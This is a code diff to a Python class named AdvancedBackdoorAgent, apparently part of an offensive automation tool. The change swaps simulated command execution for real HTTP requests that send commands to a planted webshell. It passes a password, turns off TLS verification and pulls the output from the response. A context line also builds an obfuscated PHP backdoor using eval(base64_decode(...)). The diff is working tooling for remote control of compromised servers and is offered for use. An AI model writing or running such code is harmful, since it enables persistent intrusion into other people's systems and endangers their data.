@@ -383,19 +383,51 @@ class AdvancedBackdoorAgent(BaseAgent):
         return f"<?php eval(base64_decode('{encoded}')); ?>"
     
     async def _execute_command(self, command: str, shell_access: Dict) -> Dict:
-        """Execute command on target"""
+        """Execute command on target via webshell"""
         try:
-            # Simulate command execution
-            # In real implementation, this would use the shell_access to execute the command
             log.info(f"[AdvancedBackdoorAgent] Executing: {command[:50]}...")
             
-            # Simulate success
-            await asyncio.sleep(0.5)
+            shell_url = shell_access.get("shell_url")
+            shell_password = shell_access.get("password", "")
+            shell_type = shell_access.get("shell_type", "php")
             
-            return {
-                "success": True,
-                "output": "Command executed successfully"
-            }
+            if not shell_url:
+                return {"success": False, "error": "No shell URL provided"}
+            
+            # Real HTTP request to webshell
+            import httpx
+            
+            async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
+                if "php" in shell_type.lower():
+                    # PHP webshell
+                    data = {"cmd": command, "pass": shell_password}
+                    response = await client.post(shell_url, data=data)
+                else:
+                    # Generic webshell
+                    params = {"cmd": command}
+                    response = await client.get(shell_url, params=params)
+                
+                if response.status_code == 200:
+                    output = response.text
+                    
+                    # Extract output from <pre> tags if present
+                    from bs4 import BeautifulSoup
+                    soup = BeautifulSoup(output, 'html.parser')
+                    pre_tag = soup.find('pre')
+                    if pre_tag:
+                        output = pre_tag.get_text().strip()
+                    
+                    log.success(f"[AdvancedBackdoorAgent] Command executed successfully")
+                    return {
+                        "success": True,
+                        "output": output
+                    }
+                else:
+                    log.error(f"[AdvancedBackdoorAgent] HTTP {response.status_code}")
+                    return {
+                        "success": False,
+                        "error": f"HTTP {response.status_code}"
+                    }
             
         except Exception as e:
             log.error(f"[AdvancedBackdoorAgent] Command execution failed: {e}")
